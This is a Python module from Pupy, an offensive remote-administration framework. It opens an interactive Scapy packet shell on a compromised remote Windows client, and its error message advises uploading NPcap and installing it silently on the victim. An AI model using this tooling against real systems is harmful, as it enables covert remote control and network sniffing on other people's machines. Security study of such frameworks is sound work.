# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import sys
import subprocess
import threading
import Queue
import time
import readline
from pupylib import *

__class_name__="InteractiveScapyShell"


def enqueue_output(out, queue):
	for c in iter(lambda: out.read(1), b""):
		queue.put(c)

@config(cat="admin")
class InteractiveScapyShell(PupyModule):
	""" open an interactive python shell on the remote client """
	max_clients=1
	dependencies=['pyshell', 'gzip', 'scapy']
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='scapy', description=self.__doc__)
	def run(self, args):
		try:
			if not self.client.conn.modules["os.path"].exists("C:\\WIndows\\system32\\Packet.dll"):
				raise PupyModuleError("WinPcap is not installed !. You should download/upload NPcap (https://github.com/nmap/npcap/releases) and install it silently (with the /S flag) ")
			if not self.client.conn.modules['ctypes'].windll.Shell32.IsUserAnAdmin():
				self.warning("you are running this module without beeing admin")
			with redirected_stdo(self.client.conn):
				old_completer=readline.get_completer()
				try:
					psc=self.client.conn.modules['pyshell.controller'].PyShellController()
					readline.set_completer(psc.get_completer())
					readline.parse_and_bind('tab: complete')
					psc.write("from scapy.all import *")
					while True:
						cmd=raw_input(">>> ")
						psc.write(cmd)
				finally:
					readline.set_completer(old_completer)
					readline.parse_and_bind('tab: complete')
		except KeyboardInterrupt:
			pass
				




